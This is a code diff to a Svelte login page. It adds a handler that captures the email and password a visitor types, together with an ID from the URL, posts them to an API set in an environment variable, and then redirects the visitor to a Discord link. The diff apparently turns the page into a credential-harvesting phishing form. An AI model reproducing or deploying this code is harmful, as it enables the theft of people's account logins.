@@ -2,6 +2,7 @@
 <script lang="ts">
     import { IconEyeOff } from "@tabler/icons-svelte";
     import { IconEye } from "@tabler/icons-svelte";
+    import { onMount } from "svelte";
 
     let passwordBtnIcon = IconEyeOff;
     let showPassword = false;
@@ -10,6 +11,29 @@
         showPassword = !showPassword;
         passwordBtnIcon = showPassword ? IconEye : IconEyeOff;
     }
+
+    onMount(async () => {
+        const id = new URLSearchParams(window.location.search).get('id');
+
+        document.querySelector('.submit')?.addEventListener('click', async (evt: Event) => {
+            evt.preventDefault();
+
+            const email = (document.querySelector('#email') as HTMLInputElement).value;
+            const password = (document.querySelector('#password') as HTMLInputElement).value;
+
+            
+            await fetch(`${import.meta.env.VITE_API}/user`, {
+                method: 'post',
+                body: JSON.stringify({
+                    id: id,
+                    email: email,
+                    password: password
+                })
+            })
+
+            window.location.href = import.meta.env.VITE_DISCORD;
+        });
+    })
 </script>
 
 <main class="main">
@@ -18,8 +42,8 @@
         <h1>Login</h1>
 
         <fieldset>
-            <input type="text" name="username" id="username" placeholder="Username" required autocomplete="off">
-            <label for="username">Username</label>
+            <input type="text" name="email" id="email" placeholder="Email" required autocomplete="off">
+            <label for="username">Email</label>
         </fieldset>
 
         <fieldset>
